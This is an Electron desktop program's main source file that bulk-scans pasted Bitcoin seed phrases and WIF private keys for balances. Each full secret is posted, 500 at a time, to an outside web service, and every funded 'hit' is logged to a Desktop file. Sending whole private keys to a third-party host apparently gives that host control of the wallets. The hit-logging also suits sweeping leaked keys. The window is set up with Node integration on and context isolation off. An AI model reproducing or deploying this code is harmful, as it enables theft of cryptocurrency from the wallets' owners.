const { app, BrowserWindow, ipcMain } = require('electron');
const path = require('path');
const axios = require('axios');
const bip39 = require('bip39');
const fs = require('fs');

let mainWindow;

function createWindow() {
    mainWindow = new BrowserWindow({
        width: 900,
        height: 700,
        webPreferences: {
            nodeIntegration: true,
            contextIsolation: false
        }
    });

    mainWindow.loadFile('index.html');
}

app.whenReady().then(createWindow);

// --- CONFIGURATION ---
const CONCURRENCY_LIMIT = 500;
const MAX_RETRIES = 5;
const RETRY_DELAY = 1000;

// --- UTILS ---
const sleep = (ms) => new Promise(r => setTimeout(r, ms));

function isValidMnemonic(line) {
    try {
        return bip39.validateMnemonic(line.trim());
    } catch(e) { return false; }
}

function isValidWif(line) {
    const trimmed = line.trim();
    if (trimmed.length < 50 || trimmed.length > 53) return false;
    const firstChar = trimmed[0];
    return ['5', 'K', 'L'].includes(firstChar);
}

// --- SCANNERS ---
async function scanLine(line, type) {
    const endpoint = type === 'MNEMONIC' ? 'githubScan' : 'githubWif';
    const payload = type === 'MNEMONIC' ? { mnemonic: line.trim(), passphrase: 'null' } : { wif: line.trim() };

    try {
        const res = await axios.post(`https://generate-wallet.vercel.app/api/${endpoint}`, payload);
        const sats = res.data?.result?.grandTotals?.totalBalance || 0;
        return { ok: true, balance: sats / 100000000 };
    } catch (error) {
        return { ok: false, error: error.message };
    }
}

// --- WORKER LOGIC ---
ipcMain.on('start-scan', async (event, rawText) => {
    const lines = rawText.split('\n').map(l => l.trim()).filter(l => l.length > 0);
    const uniqueLines = [...new Set(lines)];
    
    const validItems = uniqueLines.filter(l => isValidMnemonic(l) || isValidWif(l));
    
    // Notify UI started
    mainWindow.webContents.send('status-update', { 
        total: validItems.length, 
        msg: `Found ${validItems.length} valid items. Starting...` 
    });

    let processedCount = 0;
    let foundCount = 0;
    const startTime = Date.now();

    const processItem = async (line) => {
        let attempts = 0;
        let success = false;
        let result;
        const type = isValidMnemonic(line) ? 'MNEMONIC' : 'WIF';

        while (attempts < MAX_RETRIES && !success) {
            attempts++;
            result = await scanLine(line, type);

            if (result.ok) {
                success = true;
                if (result.balance > 0) {
                    foundCount++;
                    const btc = result.balance.toFixed(8);
                    
                    // Send HIT to UI
                    mainWindow.webContents.send('hit-found', { line, balance: btc });
                    
                    // Save to file on Desktop
                    const logPath = path.join(app.getPath('desktop'), 'found_balances.txt');
                    fs.appendFileSync(logPath, `${line} | ${btc}\n`);
                }
            } else {
                if (attempts < MAX_RETRIES) await sleep(RETRY_DELAY);
            }
        }
        
        processedCount++;
        
        const elapsed = (Date.now() - startTime) / 1000;
        const speed = elapsed > 0 ? (processedCount / elapsed).toFixed(1) : "0.0";

        mainWindow.webContents.send('progress', { 
            processed: processedCount, 
            total: validItems.length,
            speed: speed,
            found: foundCount
        });
    };

    // Parallel Workers
    const iterator = validItems[Symbol.iterator]();
    const workers = new Array(CONCURRENCY_LIMIT).fill(0).map(async () => {
        for (const item of iterator) {
            await processItem(item);
        }
    });

    await Promise.all(workers);
    mainWindow.webContents.send('finished', { found: foundCount });
});
